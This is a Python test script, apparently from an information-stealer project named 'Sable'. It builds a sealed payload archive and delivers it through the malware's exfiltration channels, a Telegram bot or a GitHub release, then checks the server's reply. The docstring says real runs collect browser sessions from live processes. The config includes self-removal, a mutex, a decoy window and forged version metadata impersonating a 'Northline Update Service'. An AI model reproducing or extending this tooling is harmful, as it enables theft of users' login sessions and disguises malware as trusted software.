"""Send one archive through one relay channel and capture what the server said.

This is the in-process half of the live channel test. It calls the same
``relay.deliver`` the artifact calls, against the same endpoint, and prints the answer
the remote returned rather than a line that claims success.

    python live_delivery.py telegram "9100719621:AAE...$8091562135"
    python live_delivery.py phantom  "ytripdame-sudo/SableResults$ghp_..."

For Telegram the answer is the ``sendDocument`` JSON: message id, chat id, document id,
byte size. For GitHub it is the release page URL, which the caller then re-reads through
the API to prove the page exists rather than trusting the string.

The archive is built here rather than borrowed from an earlier run: the memory-mode run
collects real sessions out of live browser processes, and posting that to a chat or a
release page would make the delivery test the incident. ``forge.payload`` is the same
walk a real build does, so the bytes are a genuine payload with nothing personal in it.
"""

from __future__ import annotations

import json
import os
import sys
from pathlib import Path

HERE = Path(__file__).resolve().parent
sys.path.insert(0, str(HERE.parent / "sable"))

from agent import relay  # noqa: E402
from core import forge, seal  # noqa: E402
from core.schema import (  # noqa: E402
    SCHEMA_VERSION,
    RelayConfig,
    RunConfig,
    SourceConfig,
    VersionConfig,
)

# The shell exports a proxy that answers 502 for everything this script talks to.
for _name in ("ALL_PROXY", "HTTP_PROXY", "HTTPS_PROXY", "NO_PROXY",
              "all_proxy", "http_proxy", "https_proxy", "no_proxy"):
    os.environ.pop(_name, None)

PROBE_DIR = HERE / "_out" / "relay-probe"
ARCHIVE = PROBE_DIR / "payload-sealed.zip"
SEAL_KEY = "bench-laptop-v1"


def config(kind: str, endpoint: str) -> RunConfig:
    return RunConfig(
        schema_version=SCHEMA_VERSION,
        mutex=r"Global\SableRelayProbe",
        seal_key=SEAL_KEY,
        relay=RelayConfig(kind=kind, endpoint=endpoint),
        sources=SourceConfig(),
        self_remove=True,
        ballast_mb=0,
        keep_local=False,
        persist=False,
        decoy_seconds=0,
        decoy_title="Northline Update Service",
        decoy_text="Preparing Northline components. This window closes itself.",
        version=VersionConfig(
            company="Northline Software Ltd",
            product="Northline Update Service",
            description="Keeps Northline components current.",
            copyright="(c) Northline Software Ltd",
            original_name=ARCHIVE.name,
            file_version="6.2.9.441",
            product_version="6.2.9.441",
        ),
    )


def build_archive(cfg: RunConfig) -> Path:
    PROBE_DIR.mkdir(parents=True, exist_ok=True)
    archive = forge.payload(HERE.parent / "sable", cfg)
    ARCHIVE.write_bytes(seal.seal(archive, SEAL_KEY))
    return ARCHIVE


def main() -> int:
    if len(sys.argv) < 3:
        raise SystemExit("usage: live_delivery.py <kind> <endpoint>")

    kind, endpoint = sys.argv[1], sys.argv[2]
    cfg = config(kind, endpoint)

    if not ARCHIVE.is_file():
        print(f"built    {build_archive(cfg)}  {ARCHIVE.stat().st_size:,} bytes")

    captured: list[bytes] = []
    original = relay._post
    if kind == "telegram":

        def capture(url: str, body: object, boundary: str, timeout: float = 30.0) -> bytes:
            answer = original(url, body, boundary, timeout)
            captured.append(answer)
            return answer

        relay._post = capture  # type: ignore[assignment]

    try:
        results = relay.deliver(cfg, ARCHIVE)
    finally:
        relay._post = original  # type: ignore[assignment]

    for item in results:
        print(f"attempt  {item.kind} ok={item.ok} {item.reason}")

    if not results or not results[-1].ok:
        return 1

    print(f"archive  {ARCHIVE.name}  {ARCHIVE.stat().st_size:,} bytes")

    if captured:
        try:
            answer = json.loads(captured[-1].decode("utf-8", "replace"))
        except ValueError:
            print("answer   not json:", captured[-1][:200])
            return 1
        if not answer.get("ok"):
            print("answer   rejected:", json.dumps(answer)[:400])
            return 1
        result = answer.get("result", {})
        document = result.get("document", {}) if isinstance(result, dict) else {}
        chat = result.get("chat", {}) if isinstance(result, dict) else {}
        print(f"message  id={result.get('message_id')}  chat={chat.get('id')} "
              f"({chat.get('type')})  date={result.get('date')}")
        print(f"document name={document.get('file_name')}  size={document.get('file_size')}  "
              f"id={(document.get('file_id') or '')[:32]}")

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
